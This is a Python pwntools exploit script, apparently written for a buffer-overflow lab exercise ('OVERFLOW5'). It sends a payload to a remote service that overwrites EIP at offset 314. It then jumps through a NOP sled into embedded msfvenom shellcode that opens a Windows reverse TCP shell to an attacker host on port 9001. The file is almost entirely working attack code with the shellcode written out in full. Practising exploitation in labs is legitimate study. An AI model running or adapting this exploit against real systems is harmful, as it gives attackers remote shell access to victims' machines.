#!/usr/bin/env python3

from pwn import *

host = "10.10.49.190"
port = 1337

s = remote(host, port)
total_length = 1000
offset = 314
new_eip = p32(0x62501203)
nop = b"\x90" * 5

buf =  b""
buf += b"\xfc\xbb\x6f\xe4\x5b\x66\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x93"
buf += b"\x0c\xd9\x66\x6b\xcd\xbe\xef\x8e\xfc\xfe\x94\xdb\xaf"
buf += b"\xce\xdf\x89\x43\xa4\xb2\x39\xd7\xc8\x1a\x4e\x50\x66"
buf += b"\x7d\x61\x61\xdb\xbd\xe0\xe1\x26\x92\xc2\xd8\xe8\xe7"
buf += b"\x03\x1c\x14\x05\x51\xf5\x52\xb8\x45\x72\x2e\x01\xee"
buf += b"\xc8\xbe\x01\x13\x98\xc1\x20\x82\x92\x9b\xe2\x25\x76"
buf += b"\x90\xaa\x3d\x9b\x9d\x65\xb6\x6f\x69\x74\x1e\xbe\x92"
buf += b"\xdb\x5f\x0e\x61\x25\x98\xa9\x9a\x50\xd0\xc9\x27\x63"
buf += b"\x27\xb3\xf3\xe6\xb3\x13\x77\x50\x1f\xa5\x54\x07\xd4"
buf += b"\xa9\x11\x43\xb2\xad\xa4\x80\xc9\xca\x2d\x27\x1d\x5b"
buf += b"\x75\x0c\xb9\x07\x2d\x2d\x98\xed\x80\x52\xfa\x4d\x7c"
buf += b"\xf7\x71\x63\x69\x8a\xd8\xec\x5e\xa7\xe2\xec\xc8\xb0"
buf += b"\x91\xde\x57\x6b\x3d\x53\x1f\xb5\xba\x94\x0a\x01\x54"
buf += b"\x6b\xb5\x72\x7d\xa8\xe1\x22\x15\x19\x8a\xa8\xe5\xa6"
buf += b"\x5f\x7e\xb5\x08\x30\x3f\x65\xe9\xe0\xd7\x6f\xe6\xdf"
buf += b"\xc8\x90\x2c\x48\x62\x6b\xa7\x7d\x62\x78\x2b\xea\x86"
buf += b"\x7e\x70\xc3\x0f\x98\x1c\x03\x46\x33\x89\xba\xc3\xcf"
buf += b"\x28\x42\xde\xaa\x6b\xc8\xed\x4b\x25\x39\x9b\x5f\xd2"
buf += b"\xc9\xd6\x3d\x75\xd5\xcc\x29\x19\x44\x8b\xa9\x54\x75"
buf += b"\x04\xfe\x31\x4b\x5d\x6a\xac\xf2\xf7\x88\x2d\x62\x3f"
buf += b"\x08\xea\x57\xbe\x91\x7f\xe3\xe4\x81\xb9\xec\xa0\xf5"
buf += b"\x15\xbb\x7e\xa3\xd3\x15\x31\x1d\x8a\xca\x9b\xc9\x4b"
buf += b"\x21\x1c\x8f\x53\x6c\xea\x6f\xe5\xd9\xab\x90\xca\x8d"
buf += b"\x3b\xe9\x36\x2e\xc3\x20\xf3\x5e\x8e\x68\x52\xf7\x57"
buf += b"\xf9\xe6\x9a\x67\xd4\x25\xa3\xeb\xdc\xd5\x50\xf3\x95"
buf += b"\xd0\x1d\xb3\x46\xa9\x0e\x56\x68\x1e\x2e\x73\x68\xa0"
buf += b"\xd0\x7c"

shellcode = buf         # msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x16\x2f\xf4\xfd" -f py

payload = [
    b"OVERFLOW5 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shellcode)),
]

payload = b"".join(payload)
s.send(payload)
s.close()